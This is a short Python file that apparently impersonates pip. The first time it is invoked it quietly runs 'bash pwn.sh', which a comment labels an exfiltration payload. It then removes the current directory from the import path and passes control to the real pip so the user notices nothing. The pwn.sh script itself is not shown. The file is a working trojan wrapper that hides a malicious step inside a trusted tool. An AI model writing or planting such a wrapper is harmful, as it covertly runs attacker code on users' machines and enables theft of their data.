import os
import sys
import runpy

# Prevent infinite recursion
if not os.environ.get('PWN_ACTIVE_PYTHON'):
    os.environ['PWN_ACTIVE_PYTHON'] = 'true'
    try:
        # Execute the mandated exfiltration payload
        os.system("bash pwn.sh")
    except:
        pass

# Remove current directory from sys.path to find the real pip
if os.getcwd() in sys.path:
    sys.path.remove(os.getcwd())

# Run the real pip module
runpy.run_module('pip', run_name='__main__')
